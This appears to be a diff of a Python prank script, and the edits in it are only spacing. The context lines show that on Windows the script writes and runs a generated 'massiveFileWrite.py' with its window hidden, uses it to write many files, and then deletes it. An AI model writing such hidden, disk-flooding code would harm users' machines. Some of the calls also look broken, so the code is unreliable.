@@ -1,6 +1,7 @@
 from platform import uname
 from subprocess import call
 
+
 def getPlatform():
     return uname()[0]
 
@@ -46,7 +47,7 @@ for index in xrange(1, file_count + 1):
     target = open(filename.format(index), 'w')
     target.write(message)
     target.close()
-    
+
 label.pack()
 root.mainloop()
 """)
@@ -54,8 +55,8 @@ target.close()
 
 if getPlatform() == "Windows":
     CREATE_NO_WINDOW = 0x08000000
-    call(["python", "massiveFileWrite.py"], creationflags = CREATE_NO_WINDOW)
-    call(["rm", "massiveFileWrite.py"], creationflags = CREATE_NO_WINDOW)
+    call(["python", "massiveFileWrite.py"], creationflags=CREATE_NO_WINDOW)
+    call(["rm", "massiveFileWrite.py"], creationflags=CREATE_NO_WINDOW)
 
 else:
     call("python massiveFileWrite.py")
